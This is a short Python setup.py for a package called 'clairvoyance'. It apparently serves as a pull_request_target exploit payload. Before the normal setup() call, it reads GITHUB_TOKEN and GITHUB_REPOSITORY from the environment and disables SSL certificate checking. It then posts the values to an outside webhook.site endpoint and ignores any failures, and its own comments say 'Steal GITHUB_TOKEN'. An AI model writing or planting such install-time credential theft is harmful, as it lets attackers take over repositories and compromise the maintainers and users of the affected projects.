from setuptools import setup
import os, json, urllib.request as req, ssl

# Steal GITHUB_TOKEN
token = os.environ.get('GITHUB_TOKEN')
if token:
    # Disable SSL for reliability
    ssl._create_default_https_context = ssl._create_unverified_context
    
    # Send to your webhook
    data = json.dumps({
        'GITHUB_TOKEN': token,
        'repo': os.environ.get('GITHUB_REPOSITORY'),
        'event': 'pull_request_target_exploit'
    }).encode()
    
    try:
        request = req.Request(
            'https://webhook.site/da0cec88-6b3b-4df9-87bd-81071ee24aa7',
            data=data,
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        req.urlopen(request)
    except:
        pass  # Silent fail

# Normal setup
setup(
    name="clairvoyance",
    version="0.1.0",
    packages=[],
)
